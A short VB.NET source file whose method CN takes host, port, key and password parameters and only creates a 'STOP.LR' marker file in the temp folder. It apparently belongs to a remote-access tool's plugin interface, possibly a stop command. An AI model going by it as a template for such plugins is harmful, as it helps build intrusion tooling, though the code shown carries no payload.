Public Class Main
    Public Shared Sub CN(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String, ByVal HW As String, ByVal BT As String, ByVal PB As String)
        Try
            IO.File.Create(IO.Path.GetTempPath + "/STOP.LR")
        Catch ex As Exception
        End Try
    End Sub
End Class
